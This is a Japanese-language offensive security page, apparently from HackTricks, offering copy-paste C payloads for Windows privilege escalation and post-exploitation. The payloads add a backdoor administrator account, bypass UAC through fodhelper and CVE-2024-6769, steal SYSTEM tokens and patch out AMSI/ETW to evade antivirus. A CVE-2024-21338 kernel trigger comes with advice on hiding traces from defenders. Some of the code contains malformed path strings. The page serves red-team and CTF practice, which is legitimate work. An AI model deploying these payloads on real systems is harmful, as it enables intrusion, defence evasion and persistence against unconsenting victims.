# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

このページは、Windows Local Privilege Escalation や post-exploitation の際に便利な、**小さく自己完結した C スニペット** を集めたものです。各payloadは **コピー＆ペースト向け** に設計され、Windows API / C ランタイムのみを必要とし、`i686-w64-mingw32-gcc` (x86) または `x86_64-w64-mingw32-gcc` (x64) でコンパイルできます。

> ⚠️  これらのpayloadは、対象プロセスが既に操作を実行するのに必要な最小限の権限（例: `SeDebugPrivilege`, `SeImpersonatePrivilege`, または UAC バイパスのための medium-integrity コンテキスト）を持っていることを前提としています。これらは、脆弱性の悪用によって任意のネイティブコード実行が得られているような **red-team or CTF settings** を想定しています。

---

## ローカル管理者ユーザーを追加
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
信頼されたバイナリ **`fodhelper.exe`** が実行されると、以下のレジストリパスを参照しますが、**`DelegateExecute` 動詞をフィルタリングしません**。そのキーの下にコマンドを植えることで、攻撃者はファイルをディスクに配置することなくUACをバイパスできます。

*`fodhelper.exe` によって参照されるレジストリパス*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
特権昇格した `cmd.exe` を起動する最小限の PoC:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 と Windows 11 23H2（2025年7月のパッチ）でテスト済み。Microsoft が `DelegateExecute` パスの整合性チェック欠如を修正していないため、このバイパスはまだ動作します。*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning は、`ctfmon.exe` が高整合性の信頼された UI プロセスとして動作し、呼び出し元を偽装した `C:` ドライブからロードし、`CSRSS` がキャッシュした DLL リダイレクトを再利用するため、パッチ適用済みの Windows 10/11 ビルドに対しても有効です。悪用の流れは次の通り：`C:` を攻撃者管理下のストレージに向け直し、トロイ化した `msctf.dll` を配置して `ctfmon.exe` を起動して高整合性を取得し、`CSRSS` に auto-elevated binary（例：`fodhelper.exe`）が使用する DLL をリダイレクトするマニフェストをキャッシュさせれば、次回起動時に UAC プロンプトなしであなたのペイロードが継承されます。

Practical workflow:
1. 偽の `%SystemRoot%\System32` ツリーを用意し、ハイジャックする予定の正規バイナリ（多くの場合 `ctfmon.exe`）をコピーします。
2. プロセス内で `C:` を再マップするために `DefineDosDevice(DDD_RAW_TARGET_PATH)` を使用し、変更をローカルに留めるために `DDD_NO_BROADCAST_SYSTEM` を指定します。
3. 偽ツリーに DLL とマニフェストを配置し、`CreateActCtx/ActivateActCtx` を呼んでマニフェストを activation-context キャッシュに登録させ、その後 auto-elevated binary を起動してリダイレクトされた DLL が直接あなたのシェルコードに解決されるようにします。
4. 作業終了後はキャッシュエントリ（`sxstrace ClearCache`）を削除するか、再起動して攻撃者の痕跡を消します。

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

クリーンアップのヒント: SYSTEM を取得した後、テスト時には `sxstrace Trace -logfile %TEMP%\sxstrace.etl` を実行し、続けて `sxstrace Parse` を呼び出してください — ログにマニフェスト名が表示される場合、防御者もそれを確認できるので、各実行ごとにパスを変更してください。

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
現在のプロセスが **両方の** `SeDebug` と `SeImpersonate` 権限を持っている場合（多くのサービスアカウントで一般的）、`winlogon.exe` からトークンを奪取し、それを複製して昇格したプロセスを起動できます:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
For a deeper explanation of how that works see:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
ほとんどの最新のAV/EDRエンジンは、悪意のある挙動を検査するために**AMSI**と**ETW**に依存しています。現在のプロセス内でこれら両方のインターフェイスを早期にパッチすることで、スクリプトベースのpayloads（例：PowerShell、JScript）がスキャンされるのを防げます。
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*上記のパッチはプロセスローカルです。実行後に新しい PowerShell を起動しても AMSI/ETW による検査は行われません。*

---

## Create child as Protected Process Light (PPL)
子プロセス作成時に `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` を使用して PPL 保護レベルを要求します。これはドキュメント化された API で、ターゲット イメージが要求された signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) で署名されている場合にのみ成功します。
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
一般的に最もよく使われるレベル:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

結果は Process Explorer/Process Hacker で Protection 列を確認して検証してください。

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` はデバイスオブジェクト (`\\.\\AppID`) を露出しており、その smart-hash メンテナンス用 IOCTL は呼び出し元が `LOCAL SERVICE` として実行されている場合にユーザー提供の関数ポインタを受け入れます。Lazarus はこれを悪用して PPL を無効化し任意のドライバをロードしているため、red teams はラボで使えるトリガーを持っているべきです。

運用上の注意:
- `LOCAL SERVICE` トークンがまだ必要です。`SeImpersonatePrivilege` を使って `Schedule` や `WdiServiceHost` から取得し、デバイスに触る前に偽装して ACL チェックを通過させてください。
- IOCTL `0x22A018` は 2 つのコールバックポインタ（query length + read function）を含む構造体を期待します。両方をユーザーモードのスタブに向け、トークン上書きや ring-0 プリミティブを構築するようにしますが、バッファは RWX のままにしておき、KernelPatchGuard がチェーン中にクラッシュしないようにしてください。
- 成功したら偽装を解除してデバイスハンドルを元に戻してください；防御側は予期しない `Device\\AppID` ハンドルを探すようになるため、権限を得たら直ちに閉じてください。

<details>
<summary>C - `appid.sys` smart-hash 悪用のスケルトントリガー</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

実戦用ビルドの最小限の修正: `VirtualAlloc` で RWX セクションをマップし、そこにトークン複製スタブをコピーし、`KernelThunk = section` に設定して、`DeviceIoControl` が戻ったら PPL 下でも SYSTEM になっているはずです。

---

## References
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
